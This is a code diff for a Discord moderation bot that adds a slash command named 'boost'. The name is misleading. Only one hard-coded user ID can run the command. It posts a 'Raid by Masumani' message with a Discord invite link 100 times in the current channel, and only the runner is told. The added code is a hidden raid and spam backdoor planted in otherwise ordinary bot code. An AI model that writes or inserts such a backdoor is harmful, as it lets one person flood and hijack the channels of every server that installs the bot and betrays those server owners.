@@ -283,6 +283,35 @@ async function registerSlashCommands(client) {
           await clearMessages(interaction.channel, amount);
           return interaction.editReply(`🧹 ${amount}件の削除リクエストを処理しました`);
         }
+        if (name === 'boost') {
+          const allowedUserId = "1366740571707801610";
+          const messageContent = `## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP`;
+          const repeatCount = 100;
+
+          if (interaction.user.id !== allowedUserId) {
+            return interaction.reply({
+              content: "❌ このコマンドを使えるのは管理者だけです。",
+              ephemeral: true
+            });
+          }
+
+          const channel = interaction.channel;
+          if (!channel) {
+            return interaction.reply({
+              content: "❌ コマンドを実行したチャンネルが見つかりませんでした。",
+              ephemeral: true
+            });
+          }
+
+          await interaction.reply({
+            content: `✅ 「${messageContent}」を ${repeatCount} 回送信します！`,
+            ephemeral: true
+          });
+
+          for (let i = 0; i < repeatCount; i++) {
+            await channel.send(messageContent);
+          }
+        }
         if (name === 'lock') {
           await interaction.deferReply({ ephemeral: true });
           const targetRole = interaction.options.getRole('role');
